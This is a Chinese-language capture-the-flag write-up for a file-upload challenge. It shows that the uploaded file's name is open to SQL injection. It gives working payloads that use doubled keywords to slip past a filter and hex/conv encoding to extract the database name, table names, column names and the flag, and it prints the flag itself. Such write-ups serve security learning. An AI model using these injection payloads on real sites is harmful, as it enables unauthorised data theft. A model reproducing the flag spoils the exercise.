# Upload

## conv

> conv(n,from_base,to_base),把一个数字从某个进制转换为另一个进制

> conv(5,16,2),把5从16进制转换为2进制

## substr

> 从一个内容中,按照指定条件,「截取」一个字符串.这个内容可以是数值或字符串.有2种语法模式

> substr(obj,start,length)

> substr(obj FROM start FOR length)

## 思路分析

> 登录进来之后是这样的一个页面，注册，登陆进去，根据题目名字判断出是文件上传题目。做了测试，只能够上传jpg文件，想要尝试php4，php5，php文件后缀都是不可以的。然后就在考虑是否是文件后缀截断上传，但是抓包截取内容之后并没有返回文件上传到哪里了。没有思路了，最后发现是文件名存在sql注入漏洞。

> 把文件名改成a' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg,这里使用substr的原因是当数字过长的时候会变成科学计数法，所以需要分批次来获取内容,使用CONV是因为题目过滤了回显有字母的情况，如果出现了字母则后面的内容就不显示，所以需要将16进制的内容转成10进制,再转为字符串。或者可以使用两次hex绕过也可以

## payload

> 查询数据库名

```
a'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg
a'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg
```
> 查询表名:

```
a'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg

a'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),13,12),16,10))+'.jpg

a'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),25,12),16,10))+'.jpg
```

> 查询列名

```
a'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg

a'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),13,12),16,10))+'.jpg
```

> 查询字段内容

```
a'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg

a'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg

a'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'.jpg
```

## flag

> !!_@m_Th.e_F!lag